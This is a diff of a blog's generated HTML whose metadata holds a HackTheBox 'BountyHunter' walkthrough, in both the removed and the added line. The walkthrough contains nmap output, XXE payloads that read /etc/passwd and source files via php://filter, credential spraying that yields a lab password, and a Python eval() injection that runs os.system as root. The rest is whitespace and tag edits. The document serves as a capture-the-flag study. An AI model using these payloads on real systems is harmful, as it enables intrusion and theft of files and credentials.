@@ -50,7 +50,7 @@
 <meta name="twitter:creator" content="@The Archivist" />
 <meta name="google-site-verification" content="google_meta_tag_verification" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"HackTheBox - BountyHunter","url":"https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/","dateModified":"2021-10-03T00:00:00+08:00","datePublished":"2021-10-03T00:00:00+08:00","author":{"@type":"Person","name":"The Archivist"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/"},"description":"Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series. I hope you have a nice weekend and without further ado, let us jump right in! Enumeration Nmap output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively. The default index shows no conspicuous detail aside from its portal redirecting to a report form. Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters. Exploitation XML Eternal Entity As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look. From here you can tell that the value of data field is encoded, so I prefer using CyberChef, a powerful yet simple utility, to analyze and decode it. Our recipe consists of URL Decode and From Base64, sequentially. The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input. You can read more about XXE here. Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the /etc/passwd on the server. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; And the return is: In case the expect:// module is available on the target server then you can craft your payload as below and actually get RCE. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;expect://ls&quot; &gt;]&gt; &lt;!-- execute &quot;ls&quot; command --&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; Unfortunately, the result is just four empty fields, which indicates that expect:// is not loaded or this is a blind injection. Not really matter, though. We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already used it in one of my university challenges. So our new payload is as following: 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; It reads and encodes index.php on the server to a base64 string. Yet it is just some HTML and CSS, nothing special so I have gobuster enumerating .php and other sensitive extensions. After retrieving db.php and decoding the content, we have some credentials. But neither test nor admin was a valid username for SSH login, so I try looking for another user with console on the server system by searching for /bin/bash or /home/(username) in the /etc/passwd file. There are just root and Development. Credentials spraying with CME In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, user.txt and pass.txt). And the valid credentials are: development:m19RoAU0hP41A1sTsq6K. Privilege Escalation To know whether development user is capable of executing command as superuser or not, try $ sudo -l: 1 2 3 4 5 6 7 8 9 10 11 development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py As can be seen, development can execute /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py as root without password. Eval() == Evil Reading /opt/skytrain_inc/ticketValidator.py source. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(&quot;**&quot;): return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &gt; 100: return True else: return False return False def main(): fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.close main() Code breakdown: load_file checks whether the file extension is .md or not. evaluate returns False whether the first line doesn’t start with # Skytrain Inc or ## Ticket to; otherwise, prints the destination and continues. reads the string below “__Ticket Code:__”, removes (**) and thereafter assigns the number before the (+) operator asticketCode. Executes the following string as code whether the modulo of ticketCode and 7 is 4. Hence, our root_ticket.md: 1 2 3 4 5 6 Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **32+100 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;) ##Issued: 2021/10/03 #End Ticket","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"HackTheBox - BountyHunter","dateModified":"2021-10-03T00:00:00+08:00","datePublished":"2021-10-03T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/"},"url":"https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/","author":{"@type":"Person","name":"The Archivist"},"description":"Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series. I hope you have a nice weekend and without further ado, let us jump right in! Enumeration Nmap output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively. The default index shows no conspicuous detail aside from its portal redirecting to a report form. Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters. Exploitation XML Eternal Entity As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look. From here you can tell that the value of data field is encoded, so I prefer using CyberChef, a powerful yet simple utility, to analyze and decode it. Our recipe consists of URL Decode and From Base64, sequentially. The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input. You can read more about XXE here. Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the /etc/passwd on the server. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; And the return is: In case the expect:// module is available on the target server then you can craft your payload as below and actually get RCE. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;expect://ls&quot; &gt;]&gt; &lt;!-- execute &quot;ls&quot; command --&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; Unfortunately, the result is just four empty fields, which indicates that expect:// is not loaded or this is a blind injection. Not really matter, though. We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already used it in one of my university challenges. So our new payload is as following: 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; It reads and encodes index.php on the server to a base64 string. Yet it is just some HTML and CSS, nothing special so I have gobuster enumerating .php and other sensitive extensions. After retrieving db.php and decoding the content, we have some credentials. But neither test nor admin was a valid username for SSH login, so I try looking for another user with console on the server system by searching for /bin/bash or /home/(username) in the /etc/passwd file. There are just root and Development. Credentials spraying with CME In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, user.txt and pass.txt). And the valid credentials are: development:m19RoAU0hP41A1sTsq6K. Privilege Escalation To know whether development user is capable of executing command as superuser or not, try $ sudo -l: 1 2 3 4 5 6 7 8 9 10 11 development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py As can be seen, development can execute /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py as root without password. Eval() == Evil Reading /opt/skytrain_inc/ticketValidator.py source. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(&quot;**&quot;): return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &gt; 100: return True else: return False return False def main(): fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.close main() Code breakdown: load_file checks whether the file extension is .md or not. evaluate returns False whether the first line doesn’t start with # Skytrain Inc or ## Ticket to; otherwise, prints the destination and continues. reads the string below “__Ticket Code:__”, removes (**) and thereafter assigns the number before the (+) operator asticketCode. Executes the following string as code whether the modulo of ticketCode and 7 is 4. Hence, our root_ticket.md: 1 2 3 4 5 6 Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **32+100 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;) ##Issued: 2021/10/03 #End Ticket","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -1904,16 +1904,6 @@ __Ticket Code:__
     
     
     
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
       
         
         
@@ -1928,20 +1918,10 @@ __Ticket Code:__
     
     
     
-  
-    
-    
-    
-    
       
         
         
 
-  
-    
-    
-    
-    
   
     
     
@@ -2028,16 +2008,6 @@ __Ticket Code:__
     
     
     
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
       
         
         
@@ -2057,20 +2027,10 @@ __Ticket Code:__
     
     
     
-  
-    
-    
-    
-    
       
         
         
 
-  
-    
-    
-    
-    
   
     
     
@@ -2118,29 +2078,6 @@ __Ticket Code:__
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2172,6 +2109,42 @@ __Ticket Code:__
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
       
     
   
@@ -2200,6 +2173,13 @@ __Ticket Code:__
     
     
     
+    
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2239,13 +2219,13 @@ __Ticket Code:__
       <a class="post-tag" href="/blog/en/tags/content/">content</a>
     
       
-      <a class="post-tag" href="/blog/en/tags/google-analytics/">google analytics</a>
-    
-      
       <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
     
       
       <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/practical-reverse-engineering/">Practical Reverse Engineering</a>
     
 
     </div>
@@ -2318,19 +2298,6 @@ __Ticket Code:__
 
   
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
   
 
   
@@ -2719,16 +2686,6 @@ We start by enumerating open ports and services on the target machine using nmap
     
     
     
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
       
         
         
@@ -2743,20 +2700,10 @@ We start by enumerating open ports and services on the target machine using nmap
     
     
     
-  
-    
-    
-    
-    
       
         
         
 
-  
-    
-    
-    
-    
   
     
     
@@ -2843,16 +2790,6 @@ We start by enumerating open ports and services on the target machine using nmap
     
     
     
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
       
         
         
@@ -2872,20 +2809,10 @@ We start by enumerating open ports and services on the target machine using nmap
     
     
     
-  
-    
-    
-    
-    
       
         
         
 
-  
-    
-    
-    
-    
   
     
     
@@ -2933,29 +2860,6 @@ We start by enumerating open ports and services on the target machine using nmap
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2987,6 +2891,42 @@ We start by enumerating open ports and services on the target machine using nmap
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
       
     
   
@@ -3015,6 +2955,13 @@ We start by enumerating open ports and services on the target machine using nmap
     
     
     
+    
+  
+    
+    
+    
+    
+      
     
   
     
@@ -3054,13 +3001,13 @@ We start by enumerating open ports and services on the target machine using nmap
       <a class="post-tag" href="/blog/en/tags/content/">content</a>
     
       
-      <a class="post-tag" href="/blog/en/tags/google-analytics/">google analytics</a>
-    
-      
       <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
     
       
       <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/practical-reverse-engineering/">Practical Reverse Engineering</a>
     
 
     </div>
